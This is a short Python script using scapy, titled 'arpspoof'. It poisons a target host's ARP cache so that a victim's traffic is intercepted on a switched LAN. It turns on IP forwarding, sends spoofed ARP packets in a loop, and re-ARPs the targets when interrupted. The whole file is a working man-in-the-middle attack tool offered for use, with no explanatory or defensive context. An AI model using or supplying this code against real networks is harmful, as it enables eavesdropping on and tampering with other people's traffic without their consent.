#!/usr/bin/python

from scapy.all import Ether, ARP, sendp, srp1, getmacbyip
import os
import sys
import signal
import argparse

run = True

def signal_handler(signum, frm):

	global run
	run = False

signal.signal(signal.SIGINT, signal_handler)

parser = argparse.ArgumentParser(description='arpspoof - intercept packets on a switched LAN')
parser.add_argument('-t','--target', help="Host to ARP poison", type=str, required=True)
parser.add_argument('-v','--victim', help="Host to intercept packets for the local gateway", type=str, required=True)
args = parser.parse_args()

tmac = getmacbyip(args.target)
vmac = getmacbyip(args.victim)
hmac = ARP().hwsrc

tip = args.target
vip = args.victim

os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

while run:

	print "%s %s arp replay %s is-at %s" % (hmac, tmac, vip, hmac)
	pkt = Ether()/ARP(op="who-has", psrc=vip, pdst=tip)
	sendp(pkt, inter=1, verbose=0)

else:
	print "Cleaning up and re-arping targets..."
	for i in range(5):
		print "%s %s arp replay %s is-at %s" %(hmac, tmac, vip, vmac)
		pkt = Ether()/ARP(op=2, hwsrc=vmac, psrc=vip, pdst=tip)
		sendp(pkt, inter=1, verbose=0)

os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

sys.exit(0)
